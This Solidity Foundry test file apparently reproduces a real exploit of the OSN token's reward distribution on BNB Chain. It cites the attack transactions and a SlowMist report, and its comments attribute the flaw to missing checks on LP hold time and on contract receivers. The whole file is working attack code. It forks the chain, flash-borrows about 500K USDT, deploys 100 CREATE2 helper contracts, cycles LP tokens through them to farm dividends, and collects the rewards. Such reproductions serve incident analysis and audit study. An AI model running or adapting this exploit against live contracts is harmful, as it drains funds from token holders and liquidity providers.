// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://app.blocksec.com/explorer/tx/bsc/0xc7927a68464ebab1c0b1af58a5466da88f09ba9b30e6c255b46b1bc2e7d1bf09
// GUY : https://twitter.com/SlowMist_Team/status/1787330586857861564
// Profit : ~109K USD
// Here is only one tx,total you can see here :https://bscscan.com/address/0x835b45d38cbdccf99e609436ff38e31ac05bc502#tokentxns
// REASON : Reward Distribution Problem
// Distribution contract did not check the LP hold time or whether the reciever is contract or not
// Actually there are 3 steps
// TX1:create help contract,split money : https://app.blocksec.com/explorer/tx/bsc/0xbf22eabb5db8785642ba17930bddef48d0d1bb94ebd1e03e7faa6f2a3d1a5540
// TX2:help contract add Liq : https://app.blocksec.com/explorer/tx/bsc/0x69c64b226f8bf06216cc665ad5e3777ad1b120909326f120f0816ac65a9099c0
// TX3:attack tx
interface Imoney {
    function addLiq(uint256 value) external;
    function cc() external;
}

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
    Uni_Pair_V2 wbnb_atm = Uni_Pair_V2(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7); 
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 OSN = IERC20(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13);
    IERC20 OSN_PAIR = IERC20(0x4EEDdCc7C8714A684311F8b01154B5686A0f612f);
    uint256 constant PRECISION = 10**18;
    address test_contract = address(this);
    uint256 borrow_amount ;
    function setUp() external {
        cheats.createSelectFork("bsc", 38474365);
        deal(address(USDT), address(this), 0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        // borrow_amount = 500_000 ether;
        borrow_amount = 500009458043549158462637;
        pool.flash(address(this),borrow_amount,0,"");
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {
        OSN.approve(address(router),type(uint256).max - 1);
        USDT.approve(address(router),type(uint256).max - 1);
        OSN_PAIR.approve(address(router),type(uint256).max - 1);
        uint256 usdt_balance = USDT.balanceOf(address(this));
        swap_token_to_ExactToken(address(USDT),address(OSN),10_000 ether,usdt_balance);
        swap_token_to_ExactToken(address(USDT),address(OSN),10_000 ether,usdt_balance);
        swap_token_to_ExactToken(address(USDT),address(OSN),10_000 ether,usdt_balance);
        swap_token_to_ExactToken(address(USDT),address(OSN),10_000 ether,usdt_balance);
        swap_token_to_ExactToken(address(USDT),address(OSN),10_000 ether,usdt_balance);
        swap_token_to_ExactToken(address(USDT),address(OSN),10_000 ether,usdt_balance);
        swap_token_to_ExactToken(address(USDT),address(OSN),10_000 ether,usdt_balance);
        usdt_balance = USDT.balanceOf(address(this));
        uint256 osn_balance = OSN.balanceOf(address(this)) - 100 * 1000000000000000; //use to transfer to contract
        console.log(usdt_balance,osn_balance);
        router.addLiquidity(address(USDT),address(OSN),usdt_balance,osn_balance,0,0,address(this),block.timestamp);
        console.log(OSN_PAIR.balanceOf(address(this)));
        uint256 pair_balance = OSN_PAIR.balanceOf(address(this));
        uint256 helpContractAmount = 100;
        uint256 i = 0;
        // step1 transfer money to the money contract
        while(i < helpContractAmount){
            address money = cal_address(i);
            USDT.transfer(money,1000000000000000);
            OSN.transfer(money,1000000000000000);
            i ++;
        }

        // step2 create contract & add liq
        create_contract(helpContractAmount);

        // step 3 attack logic
        i = 0;
        while(i < helpContractAmount){
            address money = cal_address(i);
            OSN_PAIR.transfer(money,pair_balance);
            Imoney(money).addLiq(pair_balance);
            i ++;
        }
        router.removeLiquidity(address(USDT),address(OSN),OSN_PAIR.balanceOf(address(this)),0,0,address(this),block.timestamp);
        i = 0;
        while(i<10){
            // Activate divided
            swap_token_to_ExactToken(address(USDT),address(OSN),10_000 ether,usdt_balance);
            swap_token_to_token(address(OSN),address(USDT),OSN.balanceOf(address(this)));
            i ++;
        }
        i = 0;
        while(i < helpContractAmount){
            // collect reward
            address money = cal_address(i);
            Imoney(money).cc();
            i ++;
        }

        USDT.transfer(address(pool),borrow_amount+fee0);
    }

    function swap_token_to_ExactToken(address a,address b,uint256 amountout,uint256 amountInMax) internal {
        IERC20(a).approve(address(router), amountInMax);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapTokensForExactTokens(
            amountout,amountInMax, path, address(this), block.timestamp
        );
    }

    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

    function create_contract(uint256 times) internal {
        uint256 i = 0;
        while(i<times){
            bytes memory bytecode = type(Money).creationCode;
            uint256 _salt = i;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            // console.log(hack_contract);
            address addr;
            // Use create2 to send money first.
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            i ++;
        }
    }

    function cal_address(uint256 time) internal returns(address){
        bytes memory bytecode = type(Money).creationCode;
        uint256 _salt = time;
        bytecode = abi.encodePacked(bytecode);
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        address hack_contract =  address(uint160(uint256(hash)));
        return hack_contract;
    }

}

contract Money {
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 OSN = IERC20(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13);
    IERC20 OSN_PAIR = IERC20(0x4EEDdCc7C8714A684311F8b01154B5686A0f612f);
    address owner;
    constructor() {
        owner = msg.sender;
        OSN_PAIR.approve(address(router),type(uint256).max-1);
        USDT.approve(address(router),type(uint256).max-1);
        OSN.approve(address(router),type(uint256).max-1);
        router.addLiquidity(address(USDT),address(OSN),100_000,100_000,0,0,address(this),block.timestamp);
    }

    function addLiq(uint256 value) public {
        router.removeLiquidity(address(USDT),address(OSN),35524,0,0,address(this),block.timestamp);
        OSN_PAIR.transfer(address(owner),value);
    }

    function cc() public{
        router.addLiquidity(address(USDT),address(OSN),100_000,100_000,0,0,address(this),block.timestamp);
        USDT.transfer(address(owner),USDT.balanceOf(address(this)));
    } 

}

